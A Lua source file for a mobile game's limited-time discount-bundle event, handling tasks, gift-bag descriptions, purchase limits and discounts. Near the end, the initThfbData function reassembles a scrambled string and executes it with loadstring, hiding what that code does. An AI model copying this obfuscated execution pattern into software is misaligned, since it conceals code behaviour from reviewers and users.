-- @Author hj
-- @Description 特惠风暴数值处理模型
-- @Date 2018-05-16

acThfbVoApi = {}

function acThfbVoApi:getAcVo()
	return activityVoApi:getActivityVo("thfb")
end

function acThfbVoApi:canReward()
	if self:getTaskDoneNum() > 0 then
		return true
	else
		return false
	end
end

function acThfbVoApi:updateSpecialData(data)
	local vo = self:getAcVo()
	if vo then
		vo:updateSpecialData(data)
		activityVoApi:updateShowState(vo)
	end
end

-- 获取倒计时
function acThfbVoApi:getAcTimeStr( ... )
	local str=""
	local vo=self:getAcVo()
	if vo then
		local activeTime = vo.et - base.serverTime > 0 and G_formatActiveDate(vo.et - base.serverTime) or nil
		if activeTime==nil then
			activeTime=getlocal("serverwarteam_all_end")
		end
		return getlocal("activityCountdown")..":"..activeTime
	end
	return str
end

-- 获取任务列表
function acThfbVoApi:getTaskList()
	local vo=self:getAcVo()
	if vo and vo.task then
		return vo.task
	else
		return {}
	end
end

function acThfbVoApi:getBagNameAndDesc(id,dis)
	if id == 100 then
		return getlocal("activity_thfb_giftName",{getlocal("activity_thfb_specialBag2"),dis}),getlocal("activity_thfb_giftDesc",{getlocal("activity_thfb_specialBag2"),dis})
	elseif id == 7 then
		if self:getVersion()==1 then
			return getlocal("activity_thfb_giftName",{getlocal("activity_thfb_specialBag1"),dis}),getlocal("activity_thfb_giftDesc",{getlocal("activity_thfb_specialBag1"),dis})
		else
			local vo = self:getAcVo()
			local giftNameStr = getlocal("activity_thfb_ordinaryBag",{vo.name[id]})
			return getlocal("activity_thfb_giftName",{giftNameStr,dis}),getlocal("activity_thfb_giftDesc",{giftNameStr,dis})
		end
	else
		if self:getVersion()==1 then
			return getlocal("activity_thfb_giftName",{getlocal("activity_thfb_ordinaryBag",{id}),dis}),getlocal("activity_thfb_giftDesc",{getlocal("activity_thfb_ordinaryBag",{id}),dis})
		else
			local vo = self:getAcVo()
			local showId = (id==8) and 7 or id
			local giftNameStr = getlocal("activity_thfb_ordinaryBag",{vo.name[showId]})
			return getlocal("activity_thfb_giftName",{giftNameStr,dis}),getlocal("activity_thfb_giftDesc",{giftNameStr,dis})
		end
	end
end

--version不是1的才可以用此方法
function acThfbVoApi:getBagNameStr(id)
	local vo = self:getAcVo()
	local showId = (id==8) and 7 or id
	local giftNameStr = ""
	if tostring(showId)=="c200" then
		giftNameStr = getlocal("activity_thfb_specialBag2")
	else
		giftNameStr = getlocal("activity_thfb_ordinaryBag",{vo.name[showId]})
	end
	return giftNameStr
end

-- 对任务进行排序
function acThfbVoApi:reOrderTaskList()
	local flag = 0
	local taskList = {}
	local tempList = acThfbVoApi:getTaskList()
	for k,v in pairs(tempList) do
		taskList[k] = v
		-- 设置元表，不要改变vo数据
		setmetatable(taskList,getmetatable(tempList))
	end
	for k,v in pairs(taskList) do
		for i=1,#taskList - k,1 do
			if acThfbVoApi:getTaskStatus(taskList[i].id) == 2 and acThfbVoApi:getTaskStatus(taskList[i+1].id)~= 2 then	
				local temp = taskList[i+1]
				taskList[i+1] = taskList[i]
				taskList[i] = temp
				flag = 1
			elseif acThfbVoApi:getTaskStatus(taskList[i].id) == 2 and acThfbVoApi:getTaskStatus(taskList[i+1].id) == 2 then
				if taskList[i].id == 100 then
					-- 不作交换
				elseif taskList[i+1].id == 100 then
					-- 作交换
					local temp = taskList[i+1]
					taskList[i+1] = taskList[i]
					taskList[i] = temp
					flag = 1
				elseif taskList[i].id > taskList[i+1].id then
					-- 作交换
					local temp = taskList[i+1]
					taskList[i+1] = taskList[i]
					taskList[i] = temp
					flag = 1
				else
					-- 不作交换
				end
			elseif acThfbVoApi:getTaskStatus(taskList[i].id) ~= 2 and acThfbVoApi:getTaskStatus(taskList[i+1].id)~= 2 then
				if self:taskDone(taskList[i].id) == false and self:taskDone(taskList[i+1].id) == true then
					-- 作交换
					local temp = taskList[i+1]
					taskList[i+1] = taskList[i]
					taskList[i] = temp
					flag = 1
				elseif self:taskDone(taskList[i].id) == false and self:taskDone(taskList[i+1].id) == false then
					 if taskList[i].id == 100 then
						-- 不作交换
					elseif taskList[i+1].id == 100 then
						-- 作交换
						local temp = taskList[i+1]
						taskList[i+1] = taskList[i]
						taskList[i] = temp
						flag = 1
					elseif taskList[i].id > taskList[i+1].id then
						-- 作交换
						local temp = taskList[i+1]
						taskList[i+1] = taskList[i]
						taskList[i] = temp
						flag = 1
					else
						-- 不作交换
					end
				elseif self:taskDone(taskList[i].id) == true and self:taskDone(taskList[i+1].id) == true then
					if taskList[i].id == 100 then
						-- 不作交换
					elseif taskList[i+1].id == 100 then
						-- 作交换
						local temp = taskList[i+1]
						taskList[i+1] = taskList[i]
						taskList[i] = temp
						flag = 1
					elseif taskList[i].id > taskList[i+1].id then
						-- 作交换
						local temp = taskList[i+1]
						taskList[i+1] = taskList[i]
						taskList[i] = temp
						flag = 1
					else
						-- 不作交换
					end
				else
					-- 不作交换
				end
			else
				-- 不作交换
			end

		end
		if flag == 0 then
			break
		end
	end
	return taskList
end

-- 获取礼物列表
function acThfbVoApi:getGiftBag( ... )
	local vo = self:getAcVo()
	if vo and vo.reward then
		return vo.reward
	end
end

--获取每个礼包的描述
function acThfbVoApi:getGiftBagDesc(id)
	local descStr = ""
	local buydesc = ""
	if id ~= 7 then
		if self:getVersion()==1 then
			if id == 8 then
				descStr = getlocal("activity_thfb_giftBag_special1",{self:getBuyCount(id),self:getBuyLimit(id)})
				buydesc = getlocal("activity_thfb_giftBagSpecialDesc1",{9,10,1}) 
			else
				descStr = getlocal("activity_thfb_giftBag",{id,self:getBuyCount(id),self:getBuyLimit(id)})
				buydesc = getlocal("activity_thfb_giftBagDesc",{id,1}) 
			end
		else
			local vo = self:getAcVo()
			local showId = (id==8) and 7 or id
			descStr = getlocal("activity_thfb_giftBag",{vo.name[tonumber(showId)],self:getBuyCount(id),self:getBuyLimit(id)})
			buydesc = getlocal("activity_thfb_giftBagDesc",{vo.name[tonumber(showId)],1})
		end
	else
		descStr = getlocal("activity_thfb_giftBag_special",{self:getBuyCount(id),self:getBuyLimit(id)})
		buydesc = getlocal("activity_thfb_giftBagSpecialDesc2",{1}) 
	end

	return descStr,buydesc
end

function acThfbVoApi:getTaskDesc(id)
	local descStr = ""
	local dis = self:getTaskDis(id)
	if G_isAsia() == false then
		dis = 100 - dis*10
	end
	if id ~= 7 then
		local level 
		if id == 8 then
			level = 7
			descStr = getlocal("activity_thfb_small_desc",{getlocal("activity_thfb_small_nocolor_desc",{level,self:getTaskLimit(7)}),dis})
		else
			level = id
			descStr = getlocal("activity_thfb_small_desc",{getlocal("activity_thfb_small_nocolor_desc",{level,self:getTaskLimit(id)}),dis})
		end
	else
		descStr = getlocal("activity_thfb_small_desc",{getlocal("activity_thfb_small_nocolor_desc_special",{self:getTaskLimit(100)}),dis})
	end
	return descStr
end


function acThfbVoApi:getTaskDescWithColor(id)

	local descStr = ""
	if id ~= 100 then
		descStr = getlocal("activity_thfb_task_desc",{id,self:getTaskNum(id),self:getTaskLimit(id)})
	else
		descStr = getlocal("activity_thfb_task_desc_special",{acThfbVoApi:getTaskNum(id),self:getTaskLimit(id)})
	end
	return descStr

end

-- 获取每个礼包能得到的折扣券
function acThfbVoApi:getTaskDis(id)
	if id == 7 then
		id = 8
	elseif id == 8 then
		id = 7
	end
	local taskList = self:getTaskList()
	if taskList and taskList[id] and taskList[id].dis then
		return taskList[id].dis
	end
end

-- 获取每个任务完成上限

function acThfbVoApi:getTaskLimit(id)
	if id == 100 then
		id = 8
	end
	local taskList = self:getTaskList()
	if taskList and taskList[id] and taskList[id].num then
		return taskList[id].num
	end
end

function acThfbVoApi:taskDone(id)
	local id1,id2
	id1 = id
	if id == 100 then
		id2 = 8
	else
		id2 = id
	end
	if self:getTaskNum(id1) >= self:getTaskLimit(id2) then
		return true
	else
		return false
	end
end

-- 获取每个礼包的花费
function acThfbVoApi:getBuyCost(id)

	if id == 7 then
		id = 8
	elseif id == 8 then
		id = 7
	end

	local vo = self:getAcVo()
	if vo and vo.cost and vo.cost[id] then
		return vo.cost[id]
	end
end

-- 获取礼物数量
function acThfbVoApi:getGiftNum( ... )
	local vo = self:getAcVo()
	if vo and vo.reward then
		return #vo.reward
	end
end


-- 获取等级限制
function acThfbVoApi:getLevelLimit( ... )
	local vo = self:getAcVo()
	if vo and vo.openLevel then
		return vo.openLevel
	end
end

-- 获取每个礼包的购买上限
function acThfbVoApi:getBuyLimit(id)

	if id == 7 then
		id = 8
	elseif id == 8 then
		id = 7
	end

	local vo = self:getAcVo()
	if vo and vo.buyLimit and vo.buyLimit[id] then
		return vo.buyLimit[id]
	end

end

function acThfbVoApi:judgeLimit(id)
	if self:getBuyCount(id) >= self:getBuyLimit(id) then
		return true
	else
		return false
	end
end
-- 获取任务状态列表
function acThfbVoApi:getTaskStatus(id)	
	if id == 100 then
		id = 8
	end
	local vo = self:getAcVo()
	if vo and vo.tr then
		for k,v in pairs(vo.tr) do
			if tonumber(v) == id then
				-- 已领取
				return 2
			end
		end
		return 1
	end
end


-- 获取礼包的购买次数
function acThfbVoApi:getBuyCount(id)

	local actualId
	if id == 7 then
		actualId = 8
	elseif id == 8 then
		actualId = 7
	else
		actualId = id
	end

	local vo = self:getAcVo()
	if vo and vo.rd then
		local key = "i"..tostring(actualId)
		if vo.rd[key] then
			local limit = self:getBuyLimit(id)
			if vo.rd[key] <= limit then
				return vo.rd[key]
			else
				return limit
			end
		else
			return 0
		end
	end
	return 0
end

-- 获取礼包折扣列表
function acThfbVoApi:getGiftDis(id)
	if id == 7 then
		id = 8
	elseif id == 8 then
		id = 7
	end

	local vo = self:getAcVo()
	if vo and vo.dis then
		local key = "i"..tostring(id)
		if vo.dis[key] then
			return vo.dis[key],string.format("%.2f",vo.dis[key]/10) --保留两位小数
		else
			return 10,1
		end
	end
	return 10,1

end

-- 每个任务完成的次数
function acThfbVoApi:getTaskNum(id)
	local id1,id2
	id1 = id
	if id == 100 then
		id2 = 8
	else
		id2 = id
	end
	
	local vo = self:getAcVo()
	if vo and vo.tk then
		local key = "t"..tostring(id1)
		if vo.tk[key]  then
			if vo.tk[key] <= self:getTaskLimit(id2) then
				return vo.tk[key]
			else
				return self:getTaskLimit(id2)
			end
		else
			return 0
		end
	end
	return 0
end

function acThfbVoApi:getTaskDoneNum( ... )
	local count = 0
	local vo = self:getAcVo()

	if vo and vo.task then
		local taskList = vo.task
		for k,v in pairs(taskList) do
			if self:getTaskStatus(v.id) ~= 2 and  self:getTaskNum(v.id) >= v.num then
				count = count + 1
			end
		end
	end
	
	return count
end

function acThfbVoApi:initThfbData( ... )
	
	local tmp1=	{"e","c","n","=","t"," ","d","t","n","F","a","s","d","d","o","n","k","d","e","l",".","d","f","u","v","v"," ","e","c","n"," ","i","e"," ","b","d",".","r","u","u","(","F","0","=","D","s","f","n","o",",","a"," ","d","S","u",":"," ","m"," ","d"," ","a","s","d","e","e","g","o"," ","p","i","a","a"," ","p","(","n","d","h"," "," "," ","s","e","n","D","c","n","g","f","p","e","o","n","n","a","l","S","f"," ",".","e","r","m","l","="," ",")","T","t","d","n","e","v","e","1","a","A",")","p","d"," ","i","t","e"," ","l","o","e","i","t"}
    local km1={88,4,17,117,24,78,127,101,110,91,114,108,32,131,43,8,46,22,63,28,107,123,1,20,85,106,95,103,71,104,105,55,14,41,76,73,68,44,37,16,39,112,99,96,62,38,83,126,72,47,23,120,18,33,2,19,100,10,45,79,128,60,57,69,30,109,94,80,52,61,82,35,93,118,53,58,51,66,102,98,9,116,87,25,122,13,64,3,115,15,12,121,7,130,31,54,113,29,42,84,86,129,56,59,92,97,124,77,75,34,90,89,67,48,70,119,11,26,40,21,111,81,50,36,125,49,27,65,74,6,5}
    local tmp1_2={}
    for k,v in pairs(km1) do
    	tmp1_2[v]=tmp1[k]
    end
    tmp1_2=table.concat(tmp1_2)
    local tmpFunc2=assert(loadstring(tmp1_2))
    tmpFunc2()

end

-- 获取每个不同任务对应的礼包icon
function acThfbVoApi:getBagIcon(id)

	local pic
	if id == 8 then
		pic = "gold_pack.png"
	elseif id == 7 then
		pic = "packs6.png"
	elseif id > 1 then
		pic = "packs"..(id-1)..".png"
	else
		pic = "white_pack.png"
	end

	if pic then
		return pic
	else
		return "BlackAlphaBg.png"
	end

end

function acThfbVoApi:getVersion()
	local acVo = self:getAcVo()
	if acVo and acVo.version then
		return acVo.version
	end
	return 1
end

function acThfbVoApi:getThfbAcNameStr()
	local nameStr = ""
	local version = self:getVersion()
	if version==1 then
		nameStr=getlocal("activity_thfb_title")
	else
		nameStr=getlocal("activity_thfb_v"..version.."_title")
	end
	return nameStr
end